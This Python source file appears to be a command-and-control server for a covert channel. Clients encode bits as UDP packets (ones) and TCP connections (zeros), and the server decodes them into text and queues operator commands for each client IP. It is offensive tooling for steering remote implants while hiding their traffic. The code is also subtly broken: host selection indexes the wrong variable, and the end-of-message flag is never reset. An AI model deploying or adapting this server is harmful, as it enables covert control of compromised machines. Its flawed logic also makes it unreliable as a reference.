import socket as Socket
from socket import socket
import threading
import time

#TODO look into multiple sources. Convert main binary list to dict with ip/binary pairs?

EOF = False
LOCK = threading.Lock()
LISTLOCK = threading.Lock()
HOSTDICT = dict()
PORT = 1234
HOST = "127.0.0.1"


#Thread function
def handle_UDP(UDPsock:socket,BinaryHolder:list):
    global EOF
    global LOCK
    while not EOF:
        try:
            data, addr = UDPsock.recvfrom(1024)
        except Socket.timeout:
            continue
        LOCK.acquire()
        if data != b"END" and not EOF:
            BinaryHolder.append("1")
            LOCK.release()
        else: #Message complete. Terminate thread
            EOF = True
            LOCK.release()
            break


#Thread function
def handle_TCP(TCPsock:socket,BinaryHolder:list,senderIp:list):
    global EOF
    global LOCK
    while not EOF: #Main loop
        try:
            clientSock, clientAddr = TCPsock.accept()
        except Socket.timeout:
            continue
        recv_client_list(clientAddr[0])

        LOCK.acquire()
        BinaryHolder.append("0")
        clientSock.close()
        LOCK.release()

    #Final return command
    while True:
        try:
            clientSock, clientAddr = TCPsock.accept()
            break
        except Socket.timeout:
            continue
    clientSock.send(send_client_list(clientAddr[0]).encode())
    clientSock.close()
    senderIp.append(clientAddr[0])


#Convert the collected binary list into a string
def decode(BinaryList:list):
    message = ""
    binaryString = ""
    for i in range(len(BinaryList)):
        binaryString += BinaryList[i] #int to string
    for i in range(0,len(binaryString),8):
        message += chr(int(binaryString[i:i+8],2)) #Binary piece -> ASCII code -> Char
    return message


#Determines state of client
def recv_client_list(clientAddr):
    global LISTLOCK
    global HOSTDICT
    if clientAddr not in HOSTDICT.keys(): #Checks if a client is a known host
        LISTLOCK.acquire()
        HOSTDICT[clientAddr] = list() #adds if not
        LISTLOCK.release()


#Fetch queued commands and return
def send_client_list(clientAddr) -> str: 
    global LISTLOCK
    global HOSTDICT
    with LISTLOCK:
        if len(HOSTDICT.get(clientAddr, [])) == 0: #Dict with Addr tuple keys and a list of commands as values.
            return "SLP"
        else:
            return HOSTDICT[clientAddr].pop(0)


#Builder for sockets
def build_socket(sockType, host:str, port:int) -> socket: 
    serverSock = Socket.socket(Socket.AF_INET,sockType)
    serverSock.setsockopt(Socket.SOL_SOCKET,Socket.SO_REUSEADDR,1)
    serverSock.settimeout(0.1)
    serverSock.bind((host,port))
    return serverSock


#Main incoming traffic handler
def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
    BinaryList = [] #holds all incoming binary
    senderIp = [] #holds the ip of message sender
    EOF = False

    #This is receiving data
    udp_Thread = threading.Thread(target=handle_UDP,args=(serverSocketUDP,BinaryList)) #Handles ones
    tcp_Thread = threading.Thread(target=handle_TCP,args=(serverSocketTCP,BinaryList,senderIp)) #Handles zeros
    threads = [udp_Thread,tcp_Thread]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    output = decode(BinaryList) 
    if output != "":
        print(senderIp[0]+": "+output)


def receiver_thread():
    serverSocketTCP = build_socket(Socket.SOCK_STREAM,HOST,PORT)
    serverSocketTCP.listen(5)
    serverSocketUDP = build_socket(Socket.SOCK_DGRAM,HOST,PORT)

    while True:
        receive_traffic(serverSocketUDP,serverSocketTCP)


def display_options():
    ipList = []
    selectedHost = "INVALID"
    with LISTLOCK:
        for clientIp in HOSTDICT.keys(): #Build list of IP's from HOSTDICT
            ipList.append(clientIp)
    ipList.sort() #Sort for consistent display
    optionNum = 0
    for ip in ipList:
        print(str(optionNum+1)+": "+ip) #One is added for user's sake
        optionNum += 1
    print(str(optionNum+1)+": refresh")
    userChoice = int(input("Select option: ").strip())-1 #Adjusted for 0th index
    if str(userChoice) == str(optionNum): #Refresh option
        print("Refreshing...")
        return
    else:
        with LISTLOCK:
            for clientIp in HOSTDICT.keys():
                if clientIp[0] == ip[userChoice]:
                    selectedHost = clientIp
    command = input("Input command: ").strip()
    with LISTLOCK:
        HOSTDICT[selectedHost].append(command)


def main():
    mainReceiver = threading.Thread(target=receiver_thread,args=())
    mainReceiver.start()
    while True:
        time.sleep(1)
        display_options()

main()